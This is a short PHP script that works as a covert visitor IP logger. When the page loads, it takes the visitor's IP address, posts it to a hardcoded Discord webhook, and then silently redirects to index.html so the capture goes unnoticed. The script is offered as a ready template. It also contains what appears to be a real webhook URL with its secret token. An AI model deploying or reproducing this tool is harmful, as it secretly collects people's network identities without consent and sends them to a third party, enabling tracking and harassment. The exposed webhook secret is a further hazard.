<?php
// Replace with your Discord webhook URL
$webhook_url = 'https://discord.com/api/webhooks/1370157072787832984/B6De07RFRqkLYlAt-TOHmGT2s_eI-C3EOsbCeBPzR8r2zvcteik_VdqNqV3mjINbcGOv';

// Get the IP address
$ip_address = $_SERVER['REMOTE_ADDR'];

// Prepare the message
$message = array(
    'content' => "New visitor IP: " . $ip_address
);

// Encode the message as JSON
$json_message = json_encode($message);

// Initialize cURL session
$ch = curl_init($webhook_url);

// Set cURL options
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_message);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/json',
    'Content-Length: ' . strlen($json_message)
));

// Execute cURL session
$result = curl_exec($ch);

// Close cURL session
curl_close($ch);

// Redirect to the main page
header("Location: index.html");
exit();
?>
